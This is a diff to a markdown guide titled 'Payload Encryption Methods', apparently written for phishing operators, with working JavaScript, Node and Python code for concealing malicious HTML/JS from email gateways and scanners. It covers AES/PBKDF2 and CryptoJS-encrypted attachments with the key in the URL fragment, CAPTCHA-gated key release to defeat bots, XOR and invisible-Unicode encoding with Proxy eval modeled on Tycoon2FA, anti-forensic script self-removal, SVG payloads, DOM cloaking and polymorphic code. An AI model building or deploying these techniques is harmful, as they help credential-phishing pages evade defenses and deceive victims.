@@ -1,10 +1,8 @@
 # Payload Encryption Methods
 
-Never store plaintext malicious HTML/JS in source. Always encrypt.
+Never store plaintext payload in source — always encrypt. Standard: PBKDF2 (SHA-256) derivation + AES-256-GCM via Web Crypto API.
 
 ## AES-256-GCM with PBKDF2 (recommended, 2025-2026)
-
-Best practice: PBKDF2 key derivation + AES-GCM authenticated encryption via Web Crypto API.
 
 ### Browser-side decryption
 
@@ -25,9 +23,9 @@ async function decrypt(encryptedB64, password) {
 ```
 
 Payload format: `base64(salt[16] + iv[12] + ciphertext + authTag[16])`.
-PBKDF2 iterations: 100,000 (OWASP minimum). StatiCrypt uses 600,000.
+PBKDF2 iterations: 100,000 (OWASP minimum); StatiCrypt uses 600,000.
 
-### Node.js encryption script (for build-time)
+### Node.js encryption script (build-time)
 
 ```javascript
 const crypto = require('crypto');
@@ -91,9 +89,9 @@ def encrypt_payload(content, password):
     return base64.b64encode(salt + iv + ciphertext).decode()
 ```
 
-### CryptoJS fallback (for file:// and HTTP contexts)
+### CryptoJS fallback (file:// and HTTP contexts)
 
-Web Crypto API requires HTTPS. For email attachments or HTTP pages, use CryptoJS:
+Web Crypto requires HTTPS. Email attachments/HTTP pages → CryptoJS (~50KB, works in all contexts; used by Tycoon2FA + Greatness):
 
 ```javascript
 // Encrypt (Node.js)
@@ -105,15 +103,13 @@ const decrypted = CryptoJS.AES.decrypt(encrypted, passphrase)
     .toString(CryptoJS.enc.Utf8);
 ```
 
-CryptoJS is what Tycoon2FA and Greatness use. ~50KB, works in all contexts.
-
 ### StatiCrypt CLI (quick encrypt)
 
 ```bash
 npx staticrypt page.html -p "passphrase-here"
 ```
 
-Generates self-decrypting HTML with password prompt. AES-CBC, 600K PBKDF2 iterations.
+Self-decrypting HTML with password prompt. AES-CBC, 600K PBKDF2 iterations.
 
 ## Key Sources
 
@@ -131,7 +127,7 @@ GlassWorm pattern: per-request key in custom HTTP response header + AES-256-CBC 
 
 ## CAPTCHA-Gated Decryption
 
-### Pattern A: Server releases key after Turnstile
+### Pattern A: server releases key after Turnstile
 
 ```javascript
 turnstile.render('#captcha', {
@@ -150,29 +146,26 @@ turnstile.render('#captcha', {
 });
 ```
 
-### Pattern B: Token hash as key component
+### Pattern B: token hash as key component
 
-Turnstile token itself (or its SHA256) used as part of decryption key. Unique per session, requires human interaction.
+Turnstile token (or its SHA256) = part of decryption key. Unique per session, requires human interaction.
 
-### Pattern C: Palladium + key (for existing Palladium setups)
+### Pattern C: Palladium + key (existing Palladium setups)
 
-Palladium pass → server sets cookie with decryption key → client reads cookie → decrypts payload. Bot fails Palladium → no cookie → no key → encrypted blob.
+Palladium pass → server sets cookie with key → client decrypts. Bot fails Palladium → no cookie → no key → encrypted blob.
 
 ## Encrypted HTML Attachments (email phishing)
 
-Key in URL fragment — never sent to server, invisible to email gateways.
+Key in URL fragment — never sent to server, invisible to gateways. Flow:
+1. Encrypt HTML at build time
+2. Email: `attachment.html#decryption-key-here`
+3. JS reads `location.hash`, extracts key
+4. Decrypt embedded blob → `document.write()`
 
-Flow:
-1. Encrypt HTML with AES at build time
-2. Email contains: `attachment.html#decryption-key-here`
-3. JS in attachment reads `location.hash`, extracts key
-4. Decrypts embedded blob → `document.write()` result
+Gateway sees only random Base64 — no URLs/forms, undecryptable without key.
+Real (Apr 2025): O365 phishing via AES+PBKDF2 HTML + key delivered via malicious npm package on jsDelivr CDN.
 
-Gateway sees: random Base64 data, no URLs, no forms. Can't decrypt without key.
-
-Real example (April 2025): O365 phishing via AES-encrypted HTML + PBKDF2 key + malicious npm package on jsDelivr CDN.
-
-## XOR (lightweight, for inline strings)
+## XOR (lightweight, inline strings)
 
 ```javascript
 function xorDec(encoded, key) {
@@ -183,13 +176,11 @@ function xorDec(encoded, key) {
 }
 ```
 
-Used by Salty2FA with static key `684c985a29c67596b5e66d6028bdad6d`.
+Salty2FA static key: `684c985a29c67596b5e66d6028bdad6d`.
 
 ## Invisible Unicode (Tycoon2FA, 2025)
 
-Payload encoded as invisible Hangul characters. Source looks like blank whitespace.
-
-- U+FFA0 = binary 0, U+3164 = binary 1. Eight chars = one byte.
+Payload as invisible Hangul chars — source looks like blank whitespace. U+FFA0 = binary 0, U+3164 = binary 1, 8 chars = 1 byte.
 
 ```javascript
 function encodeInvisible(js) {
@@ -210,20 +201,12 @@ function decodeInvisible(inv) {
 ```
 
 Execute via `Proxy` get-trap — code never in parseable form until runtime.
-
-GlassWorm variant: Variation Selectors (U+FE00-FE0F), each = 4 bits (nibble), 50% smaller. Key from HTTP headers.
+GlassWorm variant: Variation Selectors (U+FE00-FE0F), 4 bits (nibble) each, 50% smaller. Key from HTTP headers.
 
 ## Multi-Layer Nesting (Tycoon2FA full chain)
 
-Build-time (inner → outer):
-```
-JS payload → AES encrypt → XOR → LZString compress → Base64 → Invisible Unicode
-```
-
-Runtime (outer → inner):
-```
-Unicode decode → Base64 decode → LZString decompress → XOR decrypt → AES decrypt → Proxy eval()
-```
+Build (inner → outer): `JS payload → AES → XOR → LZString → Base64 → Invisible Unicode`
+Runtime (outer → inner): `Unicode decode → Base64 → LZString → XOR → AES → Proxy eval()`
 
 ## Anti-Forensics
 
@@ -232,8 +215,9 @@ Unicode decode → Base64 decode → LZString decompress → XOR decrypt → AES
 ```javascript
 var currentScript = document.currentScript;
 currentScript.parentNode.removeChild(currentScript);
-// Script continues executing in memory, no trace in DOM inspector
 ```
+
+Script keeps executing in memory — no trace in DOM inspector.
 
 ### Memory-only execution
 
@@ -254,14 +238,14 @@ async function executeEncrypted(encData, key) {
 
 ### One-time decryption
 
-Server deletes key after first request. Client clears key from memory after decrypt:
+Server deletes key after first request; client nulls key after decrypt:
 ```javascript
 var key = await getKey();
 var decrypted = await decrypt(payload, key);
 key = null;
 ```
 
-## SVG Encrypted Payloads (1800% increase in 2025)
+## SVG Encrypted Payloads (1800% increase 2025)
 
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg">
@@ -276,8 +260,8 @@ key = null;
 </svg>
 ```
 
-Three types: redirector SVGs, self-contained pages (Base64 HTML inside SVG), DOM injection.
-Backend polymorphism: server randomizes JS per request — five requests = five different scripts.
+Types: redirector SVGs, self-contained pages (Base64 HTML inside SVG), DOM injection.
+Backend polymorphism: JS randomized per request — 5 requests = 5 different scripts.
 
 ## DOM Cloaking
 
@@ -299,11 +283,11 @@ form.submit();
 
 ### Blob URI rendering (GhostFrame)
 
-Screenshot as blob image, invisible overlaid inputs. No `<form>`, no `action=` in source.
+Screenshot as blob image + invisible overlaid inputs. No `<form>`, no `action=` in source.
 
 ### WOFF font substitution cipher
 
-Custom font remaps glyphs. HTML contains garbled text, renders correctly only with embedded font. Pure CSS, no JS.
+Custom font remaps glyphs — HTML garbled, renders correctly only with embedded font. Pure CSS, no JS.
 
 ## Polymorphic JS
 
@@ -325,11 +309,11 @@ def mutate(template):
 
 ### LLM-based mutation (Unit42, Jan 2026)
 
-Page loads benign skeleton → client JS calls LLM API (DeepSeek, Gemini) → requests generic functions → assembles and evals unique code per visit. 36% of malicious pages use runtime assembly. Each visit = syntactically unique code, no stable signature.
+Benign skeleton page → client JS calls LLM API (DeepSeek, Gemini) for generic functions → assembles and evals unique code per visit. 36% of malicious pages use runtime assembly; each visit syntactically unique — no stable signature.
 
 ## Web Crypto API Limitations
 
-- **Requires HTTPS** (or localhost). `file://` and HTTP → use CryptoJS fallback
-- Email HTML attachments: use CryptoJS (~50KB), not Web Crypto
+- Requires HTTPS (or localhost); `file://`/HTTP → CryptoJS fallback
+- Email HTML attachments: CryptoJS (~50KB), not Web Crypto
 - All modern browsers support AES-GCM + PBKDF2
-- StatiCrypt v3 requires HTTPS (Web Crypto), v2 supports CryptoJS for HTTP
+- StatiCrypt v3 requires HTTPS (Web Crypto); v2 supports CryptoJS for HTTP
